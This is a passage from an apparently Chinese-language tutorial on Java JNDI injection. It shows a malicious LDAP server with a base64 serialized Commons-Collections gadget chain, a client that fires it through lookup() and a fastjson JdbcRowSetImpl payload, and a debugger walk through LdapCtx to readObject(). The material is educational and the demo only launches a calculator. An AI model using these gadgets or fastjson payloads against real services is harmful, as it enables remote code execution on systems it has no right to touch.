mplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));
            }catch (Exception e1){
                e1.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

服务端和客户端都需要加上依赖：

```xml
<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.80</version>  
</dependency>
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
```

客户端：

```java
package org.example;

import com.alibaba.fastjson.JSON;

import javax.naming.InitialContext;

public class JNDIGadgetClient {
    public static void main(String[] args) throws Exception{
        InitialContext context = new InitialContext();
        //lookup参数注入
        context.lookup("ldap://127.0.0.1:1234/ExportObject");
		//fastjson反序列化JNDI注入
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
```

成功弹出计算器。

##### 调试分析

因为是 LDAP 服务的`lookup()`方法的调用，每一个服务对应一个`xxxContext`，所以要先去找对应的`xxxContext`，再去找`decodeObject()`方法。

我直接在`context.lookup("ldap://127.0.0.1:1234/ExportObject");`这里打断点，开始调试。

跟进到`GenericURLContext#lookup()`之后再进入其中的`lookup()`：

![屏幕截图 2026-08-30 155012](/images/screenshots/屏幕截图 2026-08-30 155012.png)

然后再通过`p_lookup()`步入：

![屏幕截图 2026-08-30 155201](/imagesscreenshots/屏幕截图 2026-08-30 155201.png)

![屏幕截图 2026-08-30 161814](/images/screenshots/屏幕截图 2026-08-30 161814.png)

然后步入`c_lookup()`。在`LdapCtx#c_lookup()`中有调用`Obj.decodeObject()`。这里是反序列化的核心。

![屏幕截图 2026-08-30 162427](/images/screenshots/屏幕截图 2026-08-30 162427.png)

跟进去，里面有一个`getURLClassLoader()`方法。

![屏幕截图 2026-08-30 164444](/images/screenshots/屏幕截图 2026-08-30 164444.png)

往下走进入`trustURLCodebase`的判断。

![1](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/trustURLCodebase.png)

`trustURLCodebase`默认是 false，所以没法进行`URLClassLoader`的实例化。但是这里我们已经获取数据了，只是不实例化就无法加载，也无法命令执行。继续往下走，有一个`deserializeObject()`方法，这就是一个用来反序列化的方法，再看一下被反序列化的东西，是一个`javaSerializedData`数据类型的类。

![2](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/deserializeObject.png)

跟进这个方法，其中就有`readObject()`方法。

![3](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/readObject.png)

读取的数据呗反序列化，造成命令执行。

## 总结

对于 JNDI 注入，最重要的是 LDAP+Reference 这一个，理解了这一个攻击方法之后理解高版本 JDK 绕过就比较容易了。





































